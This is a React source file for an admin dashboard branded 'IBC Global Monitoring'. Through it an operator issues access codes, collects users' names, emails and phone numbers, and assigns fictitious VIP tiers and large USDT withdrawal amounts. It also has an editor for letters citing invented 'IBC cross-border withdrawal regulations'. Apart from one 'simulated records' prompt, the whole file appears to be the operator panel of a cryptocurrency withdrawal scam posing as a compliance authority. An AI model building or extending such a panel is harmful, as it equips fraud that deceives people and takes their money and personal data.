import React, { useEffect, useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History } from "lucide-react";
import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
import { useToast } from "@/hooks/use-toast";

interface AdminData {
  vipStatus: string;
  username: string;
  withdrawalAmount: string;
  withdrawalBatches: string;
  physilocal0: string;
}

interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
}

interface CaseLetter {
  id: number;
  caseId: string;
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionBTitle?: string;
  optionBDescription?: string;
}

interface Submission {
  id: number;
  caseId: string;
  selectedOption: string;
  notes?: string;
  userName?: string;
  userEmail?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  submittedAt: string;
}

export default function AdminDashboard() {
  const [cases, setCases] = useState<Case[]>([]);
  const [allSubmissions, setAllSubmissions] = useState<Submission[]>([]);
  const [selectedCase, setSelectedCase] = useState<Case | null>(null);
  const [isCreateOpen, setIsCreateOpen] = useState(false);
  const [newAccessCode, setNewAccessCode] = useState("");
  const [isFinalizeOpen, setIsFinalizeOpen] = useState(false);
  const [isLetterEditorOpen, setIsLetterEditorOpen] = useState(false);
  const [isSubmissionsOpen, setIsSubmissionsOpen] = useState(false);
  const [caseSubmissions, setCaseSubmissions] = useState<Submission[]>([]);
  const [letterData, setLetterData] = useState<Partial<CaseLetter>>({
    headline: "Withdrawal Protocol Selection",
    introduction: "",
    bodyContent: "",
    footerNote: "",
    optionATitle: "Accelerated Release",
    optionADescription: "",
    optionBTitle: "Standard Release",
    optionBDescription: ""
  });
  const [finalizeData, setFinalizeData] = useState<AdminData>({
    vipStatus: "Gold Tier",
    username: "",
    withdrawalAmount: "500,000 USDT",
    withdrawalBatches: "10",
    physilocal0: "PHY-001"
  });
  
  const { toast } = useToast();

  const loadData = async () => {
    try {
      const [casesRes, submissionsRes] = await Promise.all([
        fetch('/api/cases'),
        fetch('/api/submissions')
      ]);
      
      if (casesRes.ok) {
        const data = await casesRes.json();
        setCases(data);
      }
      
      if (submissionsRes.ok) {
        const data = await submissionsRes.json();
        setAllSubmissions(data);
      }
    } catch (error) {
      console.error('Failed to load data:', error);
    }
  };

  useEffect(() => {
    loadData();
    const interval = setInterval(loadData, 3000);
    return () => clearInterval(interval);
  }, []);

  const clearData = async () => {
    if(confirm("Clear all simulated records?")) {
      try {
        await Promise.all(cases.map(c => 
          fetch(`/api/cases/${c.id}`, { method: 'DELETE' })
        ));
        loadData();
        toast({ title: "All cases cleared", description: "Database has been reset." });
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Failed to clear cases." });
      }
    }
  };

  const handleCreateCase = async () => {
    if (!newAccessCode) return;
    
    try {
      const response = await fetch('/api/cases', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accessCode: newAccessCode,
          status: 'created'
        })
      });

      if (response.ok) {
        const newCase = await response.json();
        setIsCreateOpen(false);
        setNewAccessCode("");
        loadData();
        toast({ title: "Case Created", description: `Access Code: ${newCase.accessCode}` });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to create case." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to create case." });
    }
  };

  const openFinalizeModal = (c: Case) => {
    setSelectedCase(c);
    setFinalizeData({
      ...finalizeData,
      username: c.userName || ""
    });
    setIsFinalizeOpen(true);
  };

  const openLetterEditor = async (c: Case) => {
    setSelectedCase(c);
    try {
      const response = await fetch(`/api/cases/${c.id}/letter`);
      if (response.ok) {
        const data = await response.json();
        if (data) {
          setLetterData(data);
        } else {
          setLetterData({
            headline: "Withdrawal Protocol Selection",
            introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
            bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
            footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
            optionATitle: "Accelerated Release",
            optionADescription: "Full withdrawal amount processed in accelerated batches.",
            optionBTitle: "Standard Release",
            optionBDescription: "Half allocation processed in standard batches."
          });
        }
      }
    } catch (error) {
      console.error('Failed to load letter:', error);
    }
    setIsLetterEditorOpen(true);
  };

  const openSubmissionsModal = async (c: Case) => {
    setSelectedCase(c);
    try {
      const response = await fetch(`/api/cases/${c.id}/submissions`);
      if (response.ok) {
        const data = await response.json();
        setCaseSubmissions(data);
      }
    } catch (error) {
      console.error('Failed to load submissions:', error);
    }
    setIsSubmissionsOpen(true);
  };

  const handleSaveLetter = async () => {
    if (!selectedCase) return;
    
    try {
      const response = await fetch(`/api/cases/${selectedCase.id}/letter`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(letterData)
      });

      if (response.ok) {
        setIsLetterEditorOpen(false);
        toast({ title: "Letter Saved", description: "Custom letter content has been saved." });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to save letter." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to save letter." });
    }
  };

  const handleFinalize = async () => {
    if (!selectedCase) return;
    
    try {
      const response = await fetch(`/api/cases/${selectedCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'active',
          vipStatus: finalizeData.vipStatus,
          username: finalizeData.username,
          withdrawalAmount: finalizeData.withdrawalAmount,
          withdrawalBatches: finalizeData.withdrawalBatches,
          physilocal0: finalizeData.physilocal0
        })
      });

      if (response.ok) {
        setIsFinalizeOpen(false);
        setSelectedCase(null);
        loadData();
        toast({ title: "Account Activated", description: "User can now access the secure letter." });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
    }
  };

  const getCaseSubmissionCount = (caseId: string) => {
    return allSubmissions.filter(s => s.caseId === caseId).length;
  };

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 font-sans">
      <header className="bg-slate-950 border-b border-slate-800 px-6 py-4 flex justify-between items-center">
        <div className="flex items-center gap-3">
           <img src={ibcLogo} alt="Logo" className="h-8 w-8 opacity-80 grayscale" data-testid="img-logo" />
           <div>
             <h1 className="font-bold text-lg tracking-tight text-white">IBC GLOBAL MONITORING</h1>
             <div className="flex items-center gap-2 text-[10px] uppercase tracking-wider text-slate-400">
               <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
               System Active • ISO-D Clearance Level 1
             </div>
           </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="text-right hidden md:block">
            <p className="text-xs text-slate-400">Admin Session</p>
            <p className="text-sm font-bold text-white">Compliance Officer</p>
          </div>
          <div className="h-8 w-8 bg-slate-800 rounded-full flex items-center justify-center border border-slate-700">
            <Lock className="w-4 h-4 text-slate-400" />
          </div>
        </div>
      </header>

      <main className="p-6 max-w-7xl mx-auto">
        <Tabs defaultValue="cases" className="space-y-6">
          <TabsList className="bg-slate-800 border-slate-700">
            <TabsTrigger value="cases" className="data-[state=active]:bg-slate-700" data-testid="tab-cases">
              <FileText className="w-4 h-4 mr-2" /> Cases
            </TabsTrigger>
            <TabsTrigger value="submissions" className="data-[state=active]:bg-slate-700" data-testid="tab-submissions">
              <FolderOpen className="w-4 h-4 mr-2" /> All Submissions
            </TabsTrigger>
          </TabsList>

          <TabsContent value="cases">
            <div className="flex justify-between items-end mb-6">
              <div>
                <h2 className="text-2xl font-bold text-white mb-1">Case Management</h2>
                <p className="text-slate-400 text-sm">Manage secure access codes, edit letters, and approve synchronizations.</p>
              </div>
              <div className="flex gap-2">
                <Button onClick={() => setIsCreateOpen(true)} className="bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-new-case">
                  <Plus className="w-4 h-4 mr-2" /> New Case
                </Button>
                <Button variant="destructive" size="sm" onClick={clearData} data-testid="button-clear">
                  <Trash2 className="w-4 h-4 mr-2" /> Clear Logs
                </Button>
              </div>
            </div>

            {cases.some(c => c.status === 'syncing') && (
              <div className="mb-6 bg-amber-500/10 border border-amber-500/20 rounded-lg p-4 flex items-center justify-between">
                <div className="flex items-center gap-3 text-amber-500">
                  <ShieldAlert className="w-6 h-6 animate-pulse" />
                  <div>
                    <h3 className="font-bold">Action Required</h3>
                    <p className="text-sm opacity-80">There are users waiting for synchronization approval.</p>
                  </div>
                </div>
              </div>
            )}

            <Card className="bg-slate-950 border-slate-800 overflow-hidden">
              <CardHeader className="border-b border-slate-800 bg-slate-900/50 py-4">
                 <div className="flex justify-between items-center">
                   <CardTitle className="text-base font-medium text-white">Active Cases</CardTitle>
                   <Button variant="outline" size="sm" className="border-slate-700 bg-slate-800 text-slate-300" onClick={loadData} data-testid="button-refresh">
                     <RefreshCw className="w-4 h-4 mr-2" /> Refresh
                   </Button>
                 </div>
              </CardHeader>
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader className="bg-slate-900">
                    <TableRow className="hover:bg-slate-900 border-slate-800">
                      <TableHead className="text-slate-400 w-[100px]">Status</TableHead>
                      <TableHead className="text-slate-400">Access Code</TableHead>
                      <TableHead className="text-slate-400">User Identity</TableHead>
                      <TableHead className="text-slate-400">Contact</TableHead>
                      <TableHead className="text-slate-400 text-center">Submissions</TableHead>
                      <TableHead className="text-slate-400 text-center">Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {cases.length === 0 ? (
                      <TableRow className="hover:bg-transparent border-slate-800">
                        <TableCell colSpan={6} className="text-center py-12 text-slate-500">
                          No active cases. Create one to get started.
                        </TableCell>
                      </TableRow>
                    ) : (
                      cases.map((c) => (
                        <TableRow key={c.id} className="hover:bg-slate-900/50 border-slate-800 group" data-testid={`row-case-${c.id}`}>
                          <TableCell>
                            <Badge variant="outline" className={`
                              ${c.status === 'created' ? 'text-slate-400 border-slate-700' : ''}
                              ${c.status === 'registered' ? 'text-blue-400 border-blue-700 bg-blue-500/10' : ''}
                              ${c.status === 'syncing' ? 'text-amber-400 border-amber-700 bg-amber-500/10 animate-pulse' : ''}
                              ${c.status === 'active' ? 'text-green-400 border-green-700 bg-green-500/10' : ''}
                              ${c.status === 'completed' ? 'text-purple-400 border-purple-700 bg-purple-500/10' : ''}
                            `}>
                              {c.status.toUpperCase()}
                            </Badge>
                          </TableCell>
                          <TableCell className="font-mono text-white font-bold tracking-wider">{c.accessCode}</TableCell>
                          <TableCell className="text-slate-300">
                            {c.userName ? (
                               <div className="font-medium text-white">{c.userName}</div>
                            ) : (
                              <span className="text-slate-600 italic">Pending Login...</span>
                            )}
                          </TableCell>
                          <TableCell className="text-slate-400 text-sm">
                            {c.userEmail ? (
                              <div className="flex flex-col">
                                <span>{c.userEmail}</span>
                                <span className="text-xs opacity-70">{c.userMobile}</span>
                              </div>
                            ) : (
                              "-"
                            )}
                          </TableCell>
                          <TableCell className="text-center">
                            <Badge variant="outline" className="text-slate-400 border-slate-700">
                              {getCaseSubmissionCount(c.id)} submissions
                            </Badge>
                          </TableCell>
                          <TableCell>
                            <div className="flex justify-center gap-2">
                              {c.status === 'syncing' && (
                                <Button 
                                  size="sm" 
                                  className="bg-amber-600 hover:bg-amber-700 text-white"
                                  onClick={() => openFinalizeModal(c)}
                                  data-testid={`button-finalize-${c.id}`}
                                >
                                  <UserCheck className="w-4 h-4 mr-1" /> Finalize
                                </Button>
                              )}
                              {(c.status === 'active' || c.status === 'syncing') && (
                                <Button 
                                  size="sm" 
                                  variant="outline"
                                  className="border-slate-700 bg-slate-800"
                                  onClick={() => openLetterEditor(c)}
                                  data-testid={`button-edit-letter-${c.id}`}
                                >
                                  <Edit3 className="w-4 h-4 mr-1" /> Letter
                                </Button>
                              )}
                              {getCaseSubmissionCount(c.id) > 0 && (
                                <Button 
                                  size="sm" 
                                  variant="outline"
                                  className="border-slate-700 bg-slate-800"
                                  onClick={() => openSubmissionsModal(c)}
                                  data-testid={`button-view-submissions-${c.id}`}
                                >
                                  <History className="w-4 h-4 mr-1" /> History
                                </Button>
                              )}
                            </div>
                          </TableCell>
                        </TableRow>
                      ))
                    )}
                  </TableBody>
                </Table>
              </div>
            </Card>
          </TabsContent>

          <TabsContent value="submissions">
            <div className="mb-6">
              <h2 className="text-2xl font-bold text-white mb-1">All Submissions</h2>
              <p className="text-slate-400 text-sm">View all user submissions across all cases.</p>
            </div>

            <Card className="bg-slate-950 border-slate-800 overflow-hidden">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader className="bg-slate-900">
                    <TableRow className="hover:bg-slate-900 border-slate-800">
                      <TableHead className="text-slate-400">Date</TableHead>
                      <TableHead className="text-slate-400">User</TableHead>
                      <TableHead className="text-slate-400">Email</TableHead>
                      <TableHead className="text-slate-400">Option</TableHead>
                      <TableHead className="text-slate-400">Amount</TableHead>
                      <TableHead className="text-slate-400">Batches</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {allSubmissions.length === 0 ? (
                      <TableRow className="hover:bg-transparent border-slate-800">
                        <TableCell colSpan={6} className="text-center py-12 text-slate-500">
                          No submissions yet.
                        </TableCell>
                      </TableRow>
                    ) : (
                      allSubmissions.map((s) => (
                        <TableRow key={s.id} className="hover:bg-slate-900/50 border-slate-800" data-testid={`row-submission-${s.id}`}>
                          <TableCell className="text-slate-300 text-sm">
                            {new Date(s.submittedAt).toLocaleString()}
                          </TableCell>
                          <TableCell className="text-white font-medium">{s.userName || "-"}</TableCell>
                          <TableCell className="text-slate-400 text-sm">{s.userEmail || "-"}</TableCell>
                          <TableCell>
                            <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                              Option {s.selectedOption}
                            </Badge>
                          </TableCell>
                          <TableCell className="text-green-400 font-medium">{s.withdrawalAmount || "-"}</TableCell>
                          <TableCell className="text-slate-300">{s.withdrawalBatches || "-"}</TableCell>
                        </TableRow>
                      ))
                    )}
                  </TableBody>
                </Table>
              </div>
            </Card>
          </TabsContent>
        </Tabs>
      </main>

      {/* Create Case Modal */}
      <Dialog open={isCreateOpen} onOpenChange={setIsCreateOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
          <DialogHeader>
            <DialogTitle>Create Secure Access Case</DialogTitle>
            <DialogDescription className="text-slate-400">
              Generate a unique password for the user to access the portal.
            </DialogDescription>
          </DialogHeader>
          <div className="py-4">
            <Label htmlFor="code" className="text-slate-400">Access Password</Label>
            <Input 
              id="code" 
              value={newAccessCode} 
              onChange={(e) => setNewAccessCode(e.target.value)}
              className="bg-slate-900 border-slate-700 text-white mt-2"
              placeholder="e.g. 774982" 
              data-testid="input-access-code"
            />
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsCreateOpen(false)}>Cancel</Button>
            <Button onClick={handleCreateCase} className="bg-blue-600 text-white" data-testid="button-create-case">Create Case</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Finalize Sync Modal */}
      <Dialog open={isFinalizeOpen} onOpenChange={setIsFinalizeOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
          <DialogHeader>
            <DialogTitle>Finalize Account Reactivation</DialogTitle>
            <DialogDescription className="text-slate-400">
              Input user details to complete synchronization.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label className="text-slate-400">VIP Status</Label>
                <Input 
                  value={finalizeData.vipStatus}
                  onChange={(e) => setFinalizeData({...finalizeData, vipStatus: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                  data-testid="input-vip-status"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-slate-400">Physilocal0</Label>
                <Input 
                  value={finalizeData.physilocal0}
                  onChange={(e) => setFinalizeData({...finalizeData, physilocal0: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                  data-testid="input-physilocal0"
                />
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Username</Label>
              <Input 
                value={finalizeData.username}
                onChange={(e) => setFinalizeData({...finalizeData, username: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white"
                data-testid="input-username"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label className="text-slate-400">Withdrawal Amount</Label>
                <Input 
                  value={finalizeData.withdrawalAmount}
                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalAmount: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                  data-testid="input-withdrawal-amount"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-slate-400">Batches</Label>
                <Input 
                  value={finalizeData.withdrawalBatches}
                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalBatches: e.target.value})}
                  className="bg-slate-900 border-slate-700 text-white"
                  data-testid="input-batches"
                />
              </div>
            </div>
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsFinalizeOpen(false)}>Cancel</Button>
            <Button onClick={handleFinalize} className="bg-green-600 hover:bg-green-700 text-white gap-2" data-testid="button-finalize-submit">
              <UserCheck className="w-4 h-4" /> Accept & Finalize
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Letter Editor Modal */}
      <Dialog open={isLetterEditorOpen} onOpenChange={setIsLetterEditorOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 max-w-3xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Edit3 className="w-5 h-5" /> Edit Letter Content
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Customize the withdrawal letter for {selectedCase?.userName || "this user"}.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="space-y-2">
              <Label className="text-slate-400">Headline</Label>
              <Input 
                value={letterData.headline || ""}
                onChange={(e) => setLetterData({...letterData, headline: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white"
                data-testid="input-letter-headline"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Introduction</Label>
              <Textarea 
                value={letterData.introduction || ""}
                onChange={(e) => setLetterData({...letterData, introduction: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[80px]"
                placeholder="Dear [User Name],..."
                data-testid="input-letter-introduction"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Body Content</Label>
              <Textarea 
                value={letterData.bodyContent || ""}
                onChange={(e) => setLetterData({...letterData, bodyContent: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[100px]"
                placeholder="Main letter content..."
                data-testid="input-letter-body"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Footer Note</Label>
              <Textarea 
                value={letterData.footerNote || ""}
                onChange={(e) => setLetterData({...letterData, footerNote: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                data-testid="input-letter-footer"
              />
            </div>

            <div className="border-t border-slate-800 pt-4">
              <h4 className="text-sm font-medium text-slate-300 mb-3">Option Customization</h4>
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-slate-400">Option A Title</Label>
                  <Input 
                    value={letterData.optionATitle || ""}
                    onChange={(e) => setLetterData({...letterData, optionATitle: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white"
                    data-testid="input-option-a-title"
                  />
                  <Textarea 
                    value={letterData.optionADescription || ""}
                    onChange={(e) => setLetterData({...letterData, optionADescription: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                    placeholder="Option A description..."
                    data-testid="input-option-a-desc"
                  />
                </div>
                <div className="space-y-2">
                  <Label className="text-slate-400">Option B Title</Label>
                  <Input 
                    value={letterData.optionBTitle || ""}
                    onChange={(e) => setLetterData({...letterData, optionBTitle: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white"
                    data-testid="input-option-b-title"
                  />
                  <Textarea 
                    value={letterData.optionBDescription || ""}
                    onChange={(e) => setLetterData({...letterData, optionBDescription: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                    placeholder="Option B description..."
                    data-testid="input-option-b-desc"
                  />
                </div>
              </div>
            </div>
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsLetterEditorOpen(false)}>Cancel</Button>
            <Button onClick={handleSaveLetter} className="bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-save-letter">
              Save Letter
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Submissions History Modal */}
      <Dialog open={isSubmissionsOpen} onOpenChange={setIsSubmissionsOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 max-w-2xl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <History className="w-5 h-5" /> Submission History
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Previous submissions for {selectedCase?.userName || "this user"}.
            </DialogDescription>
          </DialogHeader>
          
          <div className="py-4">
            {caseSubmissions.length === 0 ? (
              <div className="text-center py-8 text-slate-500">
                No submissions yet for this case.
              </div>
            ) : (
              <div className="space-y-3">
                {caseSubmissions.map((s) => (
                  <div key={s.id} className="bg-slate-900 border border-slate-800 rounded-lg p-4" data-testid={`card-submission-${s.id}`}>
                    <div className="flex justify-between items-start mb-2">
                      <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                        Option {s.selectedOption}
                      </Badge>
                      <span className="text-xs text-slate-500">
                        {new Date(s.submittedAt).toLocaleString()}
                      </span>
                    </div>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <div>
                        <span className="text-slate-500">Amount:</span>{" "}
                        <span className="text-green-400">{s.withdrawalAmount}</span>
                      </div>
                      <div>
                        <span className="text-slate-500">Batches:</span>{" "}
                        <span className="text-slate-300">{s.withdrawalBatches}</span>
                      </div>
                    </div>
                    {s.notes && (
                      <div className="mt-2 text-xs text-slate-400">
                        Notes: {s.notes}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsSubmissionsOpen(false)}>Close</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
